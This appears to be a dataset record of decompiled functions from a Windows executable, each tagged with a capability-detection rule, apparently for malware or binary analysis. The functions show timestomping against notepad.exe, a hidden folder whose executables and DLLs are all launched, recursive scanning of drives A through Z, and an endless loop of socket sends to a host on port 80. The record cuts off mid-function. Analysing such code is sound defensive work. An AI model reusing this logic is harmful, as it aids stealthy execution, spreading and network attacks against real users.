            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00401c70(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    *(unaff_ESI + 0x30) = 0;\n    *(unaff_ESI + 8) = 0;\n    *(unaff_ESI + 0x10) = 0;\n    *(unaff_ESI + 0x14) = 0x201;\n    *(unaff_ESI + 0x18) = 6;\n    *(unaff_ESI + 0x1c) = 0;\n    *(unaff_ESI + 0x20) = 0;\n    *(unaff_ESI + 0x24) = 0;\n    *(unaff_ESI + 0x28) = 0;\n    *(unaff_ESI + 0x2c) = 0;\n    *(unaff_ESI + 0xc) = 0;\n    puVar1 = fcn.00422769(4);\n    if (puVar1 != NULL) {\n        uVar2 = fcn.00420590();\n        *puVar1 = uVar2;\n        iVar3 = fcn.0042034f();\n        fcn.00420756(0);\n        if (*(iVar3 + 4) != -1) {\n            *(iVar3 + 4) = *(iVar3 + 4) + 1;\n        }\n        fcn.0042077e();\n        *(unaff_ESI + 0x30) = puVar1;\n        return;\n    }\n    *(unaff_ESI + 0x30) = 0;\n    return;\n}\n",
        "token_count": 388
    },
    "00401fe0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401fe0(uint arg_8h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    char *pcVar4;\n    uint arg_8h_00;\n    uint arg_10h;\n    int32_t iVar5;\n    uint unaff_EDI;\n    uint lpCreationTime;\n    uint var_98h;\n    uint var_94h;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    var_98h = arg_8h;\n    pcVar4 = fcn.00420d1e(\"SYSTEMROOT\");\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    arg_8h_00 = fcn.0041ff97(pcVar4 + (0x20 - pcVar1));\n    arg_10h = fcn.00420d1e(\"SYSTEMROOT\");\n    fcn.00420bd5(arg_8h_00, \"%s\\\\notepad.exe\", arg_10h);\n    pcVar3 = _sym.imp.KERNEL32.DLL_OpenFile;\n    iVar5 = (*_sym.imp.KERNEL32.DLL_OpenFile)(arg_8h_00, &var_94h, 0);\n    if (iVar5 != -1) {\n        (*_sym.imp.KERNEL32.DLL_GetFileTime)(iVar5, &lpCreationTime, 0, 0);\n        (*_sym.imp.KERNEL32.DLL_CloseHandle)(iVar5);\n        iVar5 = (*pcVar3)(var_98h, &var_94h, 2);\n        if (iVar5 != -1) {\n            (*_sym.imp.KERNEL32.DLL_SetFileTime)(iVar5, &lpCreationTime, 0, 0);\n            (*_sym.imp.KERNEL32.DLL_CloseHandle)(iVar5);\n        }\n    }\n    fcn.00420c59(arg_8h_00);\n    fcn.00420bc6(unaff_EDI);\n    return;\n}\n",
        "token_count": 487
    },
    "004023e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004023e0(code **param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = param_1[0xe];\n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.00420756(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            iVar3 = *(uVar2 + 4);\n            fcn.0042077e();\n            puVar4 = ~-(iVar3 != 0) & uVar2;\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.004220e7(puVar1);\n    }\n    fcn.004207af();\n    return;\n}\n",
        "token_count": 278
    },
    "00403c10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\ncode ** __cdecl fcn.00403c10(code **arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x437e9b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *arg_8h = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    fcn.00420795(uVar1);\n    var_4h = 0;\n    puVar2 = fcn.00422769(4);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        uVar3 = fcn.00420590();\n        *puVar2 = uVar3;\n        iVar4 = fcn.0042034f();\n        fcn.00420756(0);\n        if (*(iVar4 + 4) != -1) {\n            *(iVar4 + 4) = *(iVar4 + 4) + 1;\n        }\n        fcn.0042077e();\n    }\n    arg_8h[4] = arg_8h + 2;\n    arg_8h[8] = arg_8h + 6;\n    arg_8h[9] = arg_8h + 7;\n    arg_8h[0xe] = puVar2;\n    arg_8h[5] = arg_8h + 3;\n    arg_8h[0xc] = arg_8h + 10;\n    arg_8h[0xd] = arg_8h + 0xb;\n    arg_8h[3] = NULL;\n    *arg_8h[9] = 0;\n    *arg_8h[0xd] = 0;\n    *arg_8h[4] = 0;\n    *arg_8h[8] = 0;\n    *arg_8h[0xc] = 0;\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 530
    },
    "00403d00": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00403d00(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *unaff_EDI;\n    uint var_4h;\n    \n    iVar1 = **(in_EAX + 0x38);\n    *unaff_EDI = iVar1;\n    fcn.00420756(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042077e();\n    return;\n}\n",
        "token_count": 129
    },
    "00403d40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch_3\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __thiscall fcn.00403d40(uint *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *arg_8h;\n    uint *arg_ch;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_4h;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack60;\n    code *apcStack44 [3];\n    uint32_t var_28h;\n    uint uStack28;\n    uint *puStack24;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h_2;\n    uint var_ch_3;\n    \n    var_14h = 0x437e70;\n    var_18h = *in_FS_OFFSET;\n    uStack60 = *0x441480 ^ &var_ch_3;\n    var_1ch = &uStack60;\n    *in_FS_OFFSET = &var_18h;\n    uVar4 = var_4h | 0xf;\n    uVar5 = var_4h;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = param_1[5];\n        uVar3 = uVar1 >> 1;\n        uVar5 = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar5 = uVar3 + uVar1,  -uVar3 - 2 < uVar1)) {\n            uVar5 = 0xfffffffe;\n        }\n    }\n    arg_8h = NULL;\n    var_10h_2 = 0;\n    puStack24 = param_1;\n    puVar2 = &uStack60;\n    if ((uVar5 + 1 != 0) && (arg_8h = fcn.00422769(uVar5 + 1),  puVar2 = var_1ch,  arg_8h == NULL)) {\n        uStack28 = 0;\n        fcn.00421094(&uStack28);\n        apcStack44[0] = vtable.std::bad_alloc.0;\n        fcn.00424181(apcStack44, 0x43f8b4);\n        var_28h = var_4h;\n        var_10h_2 = CONCAT31(var_10h_2._1_3_, 2);\n        var_1ch = &stack0xffffffb8;\n        fcn.00403f60(var_4h + 1);\n        return 0x403e16;\n    }\n    var_1ch = puVar2;\n    if (param_3 != 0) {\n        arg_ch = param_1;\n        if (0xf < param_1[5]) {\n            arg_ch = *param_1;\n        }\n        fcn.00423e20(arg_8h, arg_ch, param_3);\n    }\n    if (0xf < param_1[5]) {\n        fcn.004220e7();\n    }\n    *param_1 = 0;\n    *param_1 = arg_8h;\n    param_1[5] = uVar5;\n    param_1[4] = param_3;\n    if (0xf < uVar5) {\n        param_1 = arg_8h;\n    }\n    *(param_1 + param_3) = 0;\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 853
    },
    "00403eb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403eb0(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x438068;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x441480 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00401c30(uVar2);\n    var_4h = 0;\n    piVar3 = fcn.00403fb0();\n    var_4h = 0xffffffff;\n    if (arg_8h != 0) {\n        fcn.00420756(0);\n        iVar1 = *(arg_8h + 4);\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            *(arg_8h + 4) = iVar1 + -1;\n        }\n        iVar1 = *(arg_8h + 4);\n        fcn.0042077e();\n        puVar4 = ~-(iVar1 != 0) & arg_8h;\n        if (puVar4 != NULL) {\n            (***puVar4)(1);\n        }\n    }\n    (**(*piVar3 + 0x18))(0x20);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 354
    },
    "00403f60": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403f60(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *var_ch;\n    \n    iVar1 = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.00422769(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.00421094(&arg_8h);\n        var_ch = vtable.std::bad_alloc.0;\n        iVar1 = fcn.00424181(&var_ch, 0x43f8b4);\n    }\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "004085f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004085f0(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char *lpPathName;\n    int32_t iVar3;\n    char *pcVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint unaff_EBX;\n    int32_t iStack324;\n    uint uStack320;\n    uchar auStack316 [36];\n    char acStack280 [268];\n    uint32_t uStack12;\n    \n    uStack12 = *0x441480 ^ &iStack324;\n    lpPathName = fcn.00401330();\n    iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(lpPathName);\n    if (iVar3 == 0) {\n        fcn.004232df(lpPathName);\n        fcn.00401fe0(lpPathName);\n        (*_sym.imp.KERNEL32.DLL_SetFileAttributesA)(lpPathName, 6);\n    }\n    pcVar4 = lpPathName;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uVar5 = fcn.0041ff97(pcVar4 + (8 - (lpPathName + 1)));\n    uStack320 = uVar5;\n    fcn.00420bd5(uVar5, \"%s\\\\*\", lpPathName);\n    iStack324 = fcn.00422c32(uVar5, auStack316);\n    pcVar2 = _sym.imp.SHELL32.dll_ShellExecuteA;\n    if ((iStack324 != 0) && (iStack324 != -1)) {\n        do {\n            pcVar4 = lpPathName;\n            do {\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar4 + 1;\n            } while (cVar1 != '\\0');\n            pcVar6 = acStack280;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            uVar5 = fcn.0041ff97(pcVar4 + pcVar6 + ((8 - (acStack280 + 1)) - (lpPathName + 1)));\n            fcn.00420bd5(uVar5, 0x43c26c, lpPathName);\n            iVar3 = fcn.00422b30(acStack280, \".dll\");\n            if (iVar3 == 0) {\n                iVar3 = fcn.00422b30(acStack280, \".exe\");\n                if (iVar3 != 0) {\n                    (*pcVar2)(0, \"open\", uVar5, 0x43c488, 0, 5);\n                }\n            }\n            else {\n                (*_sym.imp.KERNEL32.DLL_LoadLibraryA)(uVar5);\n            }\n            fcn.00420c59(uVar5);\n            iVar3 = fcn.00422d59(iStack324, auStack316);\n        } while (iVar3 == 0);\n        fcn.00422e87(iStack324);\n        uVar5 = uStack320;\n    }\n    fcn.00420c59(uVar5);\n    fcn.00420c59(lpPathName);\n    fcn.00420bc6(unaff_EBX);\n    return;\n}\n",
        "token_count": 743
    },
    "00408ca0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ca0(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint in_stack_00000170;\n    uint in_stack_00000180;\n    uint32_t in_stack_00000184;\n    ushort in_stack_00000188;\n    uint in_stack_0000018c;\n    int32_t in_stack_00000198;\n    \n    fcn.00432700();\n    fcn.00429890(&stack0x000001a4, 0x61, 0x19000);\n    pcVar3 = _sym.imp.WSOCK32.dll_connect;\n    pcVar2 = _sym.imp.WSOCK32.dll_htons;\n    pcVar1 = _sym.imp.KERNEL32.DLL_Sleep;\n    do {\n        iVar5 = (*_sym.imp.WSOCK32.dll_WSAStartup)(0x101, &stack0xfffffffc);\n        if (-1 < iVar5) {\n            in_stack_00000184 = (*_sym.imp.WSOCK32.dll_socket)(2, 1, 0);\n            if (in_stack_00000184 != 0xffffffff) {\n                in_stack_00000198 = (*_sym.imp.WSOCK32.dll_gethostbyname)(unaff_ESI);\n                if (in_stack_00000198 != 0) {\n                    in_stack_00000188 = 2;\n                    in_stack_0000018c = ***(in_stack_00000198 + 0xc);\n                    uVar4 = (*pcVar2)(0x50);\n                    in_stack_00000184 = in_stack_00000184 & 0xffff | uVar4 << 0x10;\n                    (*pcVar3)(in_stack_00000180, &stack0x00000184, 0x10);\n                }\n            }\n        }\n        (*_sym.imp.WSOCK32.dll_send)(in_stack_00000184, &stack0x0000019c, 0x19000, 0);\n        (*pcVar1)(1);\n        (*_sym.imp.WSOCK32.dll_closesocket)(in_stack_00000170);\n    } while( true );\n}\n",
        "token_count": 504
    },
    "0040aab0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_268h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040aab0(char *arg_8h, char *arg_ch, code *arg_10h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_00;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_238h;\n    uint var_134h;\n    uint var_110h;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    pcVar3 = arg_8h;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    pcVar4 = arg_ch;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    arg_8h_00 = fcn.0041ff97(pcVar3 + pcVar4 + ((0x20 - (arg_ch + 1)) - (arg_8h + 1)));\n    fcn.00420bd5(arg_8h_00, 0x43e138, arg_8h);\n    iVar5 = fcn.00422c32(arg_8h_00, &var_134h);\n    if ((iVar5 != 0) && (iVar5 != -1)) {\n        do {\n            if ((var_134h & 0x10) != 0) {\n                puVar9 = 0x43e13c;\n                puVar6 = &var_110h;\n                do {\n                    uVar2 = *puVar6;\n                    bVar10 = uVar2 < *puVar9;\n                    if (uVar2 != *puVar9) {\ncode_r0x0040ab78:\n                        iVar7 = (1 - bVar10) - (bVar10 != 0);\n                        goto code_r0x0040ab7d;\n                    }\n                    if (uVar2 == 0) break;\n                    uVar2 = *(puVar6 + 1);\n                    bVar10 = uVar2 < puVar9[1];\n                    if (uVar2 != puVar9[1]) goto code_r0x0040ab78;\n                    puVar6 = puVar6 + 2;\n                    puVar9 = puVar9 + 2;\n                } while (uVar2 != 0);\n                iVar7 = 0;\ncode_r0x0040ab7d:\n                if (iVar7 != 0) {\n                    puVar9 = 0x43e140;\n                    puVar6 = &var_110h;\n                    do {\n                        uVar2 = *puVar6;\n                        bVar10 = uVar2 < *puVar9;\n                        if (uVar2 != *puVar9) {\ncode_r0x0040abb0:\n                            iVar7 = (1 - bVar10) - (bVar10 != 0);\n                            goto code_r0x0040abb5;\n                        }\n                        if (uVar2 == 0) break;\n                        uVar2 = *(puVar6 + 1);\n                        bVar10 = uVar2 < puVar9[1];\n                        if (uVar2 != puVar9[1]) goto code_r0x0040abb0;\n                        puVar6 = puVar6 + 2;\n                        puVar9 = puVar9 + 2;\n                    } while (uVar2 != 0);\n                    iVar7 = 0;\ncode_r0x0040abb5:\n                    if (iVar7 != 0) {\n                        puVar9 = 0x43c488;\n                        puVar6 = &var_110h;\n                        do {\n                            uVar2 = *puVar6;\n                            bVar10 = uVar2 < *puVar9;\n                            if (uVar2 != *puVar9) {\ncode_r0x0040abe8:\n                                iVar7 = (1 - bVar10) - (bVar10 != 0);\n                                goto code_r0x0040abed;\n                            }\n                            if (uVar2 == 0) break;\n                            uVar2 = *(puVar6 + 1);\n                            bVar10 = uVar2 < puVar9[1];\n                            if (uVar2 != puVar9[1]) goto code_r0x0040abe8;\n                            puVar6 = puVar6 + 2;\n                            puVar9 = puVar9 + 2;\n                        } while (uVar2 != 0);\n                        iVar7 = 0;\ncode_r0x0040abed:\n                        if (iVar7 != 0) {\n                            pcVar3 = arg_8h;\n                            do {\n                                cVar1 = *pcVar3;\n                                pcVar3 = pcVar3 + 1;\n                            } while (cVar1 != '\\0');\n                            puVar6 = &var_110h;\n                            do {\n                                cVar1 = *puVar6;\n                                puVar6 = puVar6 + 1;\n                            } while (cVar1 != '\\0');\n                            uVar8 = fcn.0041ff97(pcVar3 + puVar6 + ((8 - (&var_110h + 1)) - (arg_8h + 1)));\n                            fcn.00420bd5(uVar8, \"%s%s\\\\\", arg_8h);\n                            fcn.0040aab0(uVar8, arg_ch, arg_10h);\n                            fcn.00420c59(uVar8);\n                        }\n                    }\n                }\n            }\n            iVar7 = fcn.00422d59(iVar5, &var_134h);\n        } while (iVar7 == 0);\n        fcn.00422e87(iVar5);\n    }\n    fcn.00420bd5(arg_8h_00, 0x43dd20, arg_8h);\n    iVar5 = fcn.00422c32(arg_8h_00, &var_25ch);\n    if ((iVar5 != 0) && (iVar5 != -1)) {\n        do {\n            if ((var_25ch & 0x10) == 0) {\n                puVar9 = 0x43c488;\n                puVar6 = &var_238h;\n                do {\n                    uVar2 = *puVar6;\n                    bVar10 = uVar2 < *puVar9;\n                    if (uVar2 != *puVar9) {\ncode_r0x0040acf8:\n                        iVar7 = (1 - bVar10) - (bVar10 != 0);\n                        goto code_r0x0040acfd;\n                    }\n                    if (uVar2 == 0) break;\n                    uVar2 = *(puVar6 + 1);\n                    bVar10 = uVar2 < puVar9[1];\n                    if (uVar2 != puVar9[1]) goto code_r0x0040acf8;\n                    puVar6 = puVar6 + 2;\n                    puVar9 = puVar9 + 2;\n                } while (uVar2 != 0);\n                iVar7 = 0;\ncode_r0x0040acfd:\n                if (iVar7 != 0) {\n                    pcVar3 = arg_8h;\n                    do {\n                        cVar1 = *pcVar3;\n                        pcVar3 = pcVar3 + 1;\n                    } while (cVar1 != '\\0');\n                    puVar6 = &var_238h;\n                    do {\n                        cVar1 = *puVar6;\n                        puVar6 = puVar6 + 1;\n                    } while (cVar1 != '\\0');\n                    uVar8 = fcn.0041ff97(pcVar3 + puVar6 + ((8 - (&var_238h + 1)) - (arg_8h + 1)));\n                    fcn.00420bd5(uVar8, 0x43dd20, arg_8h);\n                    (*arg_10h)(uVar8);\n                    fcn.00420c59(uVar8);\n                }\n            }\n            iVar7 = fcn.00422d59(iVar5, &var_25ch);\n        } while (iVar7 == 0);\n        fcn.00422e87(iVar5);\n    }\n    fcn.00420c59(arg_8h_00);\n    fcn.00420bc6(arg_10h);\n    return;\n}\n",
        "token_count": 1952
    },
    "0040ada0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_270h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040ada0(char *arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint arg_8h_00;\n    int32_t iVar6;\n    uint *puVar7;\n    uint uVar8;\n    uint8_t *puVar9;\n    bool bVar10;\n    int32_t var_270h;\n    int32_t var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_240h;\n    uint var_13ch;\n    uint var_118h;\n    uint pszPath;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    var_26ch = 0x41;\n    var_270h = 0x1a;\n    do {\n        fcn.00420bd5(&pszPath, \"%c:\\\\\", var_26ch);\n        iVar3 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(&pszPath);\n        if (iVar3 != 0) {\n            puVar4 = &pszPath;\n            do {\n                cVar1 = *puVar4;\n                puVar4 = puVar4 + 1;\n            } while (cVar1 != '\\0');\n            pcVar5 = arg_8h;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            arg_8h_00 = fcn.0041ff97(pcVar5 + puVar4 + ((0x20 - (&pszPath + 1)) - (arg_8h + 1)));\n            fcn.00420bd5(arg_8h_00, 0x43e138, &pszPath);\n            iVar3 = fcn.00422c32(arg_8h_00, &var_13ch);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                do {\n                    if ((var_13ch & 0x10) != 0) {\n                        puVar9 = 0x43e13c;\n                        puVar4 = &var_118h;\n                        do {\n                            uVar2 = *puVar4;\n                            bVar10 = uVar2 < *puVar9;\n                            if (uVar2 != *puVar9) {\ncode_r0x0040aea0:\n                                iVar6 = (1 - bVar10) - (bVar10 != 0);\n                                goto code_r0x0040aea5;\n                            }\n                            if (uVar2 == 0) break;\n                            uVar2 = *(puVar4 + 1);\n                            bVar10 = uVar2 < puVar9[1];\n                            if (uVar2 != puVar9[1]) goto code_r0x0040aea0;\n                            puVar4 = puVar4 + 2;\n                            puVar9 = puVar9 + 2;\n                        } while (uVar2 != 0);\n                        iVar6 = 0;\ncode_r0x0040aea5:\n                        if (iVar6 != 0) {\n                            puVar9 = 0x43e140;\n                            puVar4 = &var_118h;\n                            do {\n                                uVar2 = *puVar4;\n                                bVar10 = uVar2 < *puVar9;\n                                if (uVar2 != *puVar9) {\ncode_r0x0040aed8:\n                                    iVar6 = (1 - bVar10) - (bVar10 != 0);\n                                    goto code_r0x0040aedd;\n                                }\n                                if (uVar2 == 0) break;\n                                uVar2 = *(puVar4 + 1);\n                                bVar10 = uVar2 < puVar9[1];\n                                if (uVar2 != puVar9[1]) goto code_r0x0040aed8;\n                                puVar4 = puVar4 + 2;\n                                puVar9 = puVar9 + 2;\n                            } while (uVar2 != 0);\n                            iVar6 = 0;\ncode_r0x0040aedd:\n                            if (iVar6 != 0) {\n                                puVar9 = 0x43c488;\n                                puVar4 = &var_118h;\n                                do {\n                                    uVar2 = *puVar4;\n                                    bVar10 = uVar2 < *puVar9;\n                                    if (uVar2 != *puVar9) {\ncode_r0x0040af10:\n                                        iVar6 = (1 - bVar10) - (bVar10 != 0);\n                                        goto code_r0x0040af15;\n                                    }\n                                    if (uVar2 == 0) break;\n                                    uVar2 = *(puVar4 + 1);\n                                    bVar10 = uVar2 < puVar9[1];\n                                    if (uVar2 != puVar9[1]) goto code_r0x0040af10;\n                                    puVar4 = puVar4 + 2;\n                                    puVar9 = puVar9 + 2;\n                                } while (uVar2 != 0);\n                                iVar6 = 0;\ncode_r0x0040af15:\n                                if (iVar6 != 0) {\n                                    puVar4 = &pszPath;\n                                    do {\n                                        puVar7 = puVar4;\n                                        puVar4 = puVar7 + 1;\n                                    } while (*puVar7 != '\\0');\n                                    puVar4 = &var_118h;\n                                    do {\n                                        cVar1 = *puVar4;\n                                        puVar4 = puVar4 + 1;\n                                    } while (cVar1 != '\\0');\n                                    uVar8 = fcn.0041ff97(puVar4 + *0x10 * -2 + puVar7 + 0x137);\n                                    fcn.00420bd5(uVar8, \"%s%s\\\\\", &pszPath);\n                                    fcn.0040aab0(uVar8, arg_8h, fcn.0040a740);\n                                    fcn.00420c59(uVar8);\n                                }\n                            }\n                        }\n                    }\n                    iVar6 = fcn.00422d59(iVar3, &var_13ch);\n                } while (iVar6 == 0);\n                fcn.00422e87(iVar3);\n            }\n            fcn.00420bd5(arg_8h_00, 0x43dd20, &pszPath);\n            iVar3 = fcn.00422c32(arg_8h_00, &var_264h);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                do {\n                    if ((var_264h & 0x10) == 0) {\n                        puVar9 = 0x43c488;\n                        puVar4 = &var_240h;\n                        do {\n                            uVar2 = *puVar4;\n                            bVar10 = uVar2 < *puVar9;\n                            if (uVar2 != *puVar9) {\ncode_r0x0040b012:\n                                iVar6 = (1 - bVar10) - (bVar10 != 0);\n                                goto code_r0x0040b017;\n                            }\n                            if (uVar2 == 0) break;\n                            uVar2 = *(puVar4 + 1);\n                            bVar10 = uVar2 < puVar9[1];\n                            if (uVar2 != puVar9[1]) goto code_r0x0040b012;\n                            puVar4 = puVar4 + 2;\n                            puVar9 = puVar9 + 2;\n                        } while (uVar2 != 0);\n                        iVar6 = 0;\ncode_r0x0040b017:\n                        if (iVar6 != 0) {\n                            puVar4 = &pszPath;\n                            do {\n                                puVar7 = puVar4;\n                                puVar4 = puVar7 + 1;\n                            } while (*puVar7 != '\\0');\n                            puVar4 = &var_240h;\n                            do {\n                                cVar1 = *puVar4;\n                                puVar4 = puVar4 + 1;\n                            } while (cVar1 != '\\0');\n                            uVar8 = fcn.0041ff97(puVar4 + *0x10 * -2 + puVar7 + 0x25f);\n                            fcn.00420bd5(uVar8, 0x43dd20, &pszPath);\n                            fcn.0040a740(uVar8);\n                            fcn.00420c59(uVar8);\n                        }\n                    }\n                    iVar6 = fcn.00422d59(iVar3, &var_264h);\n                } while (iVar6 == 0);\n                fcn.00422e87(iVar3);\n            }\n            fcn.00420c59(arg_8h_00);\n        }\n        var_26ch = var_26ch + 1;\n        var_270h = var_270h + -1;\n        if (var_270h == 0) {\n            fcn.00420bc6(0);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 2058
    },
    "0040b0d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b13b)\n\nvoid fcn.0040b0d0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint16_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    char *pcVar11;\n    int32_t iVar12;\n    int32_t **in_FS_OFFSET;\n    bool bVar13;\n    int64_t iVar14;\n    int64_t iVar15;\n    ulong uVar16;\n    uint in_stack_fffffa24;\n    uchar auStack1480 [372];\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1092;\n    uint32_t uStack1088;\n    ushort auStack1084 [2];\n    uint auStack1080 [3];\n    int32_t iStack1068;\n    uchar auStack1064 [1024];\n    uint uStack40;\n    uint32_t uStack28;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x437d4b;\n    piStack20 = *in_FS_OFFSET;\n    uStack28 = *0x441480 ^ &stack0xfffffa24;\n    uVar8 = *0x441480 ^ &stack0xfffffa18;\n    *in_FS_OFFSET = &piStack20;\n    iVar14 = fcn.00420e6f(0);\n    iVar12 = iVar14 >> 0x20;\n    iVar15 = fcn.00420e6f(0);\n    if (iVar15 - iVar14 < 300) {\n        do {\n            uVar6 = *0x444a90;\n            uVar5 = 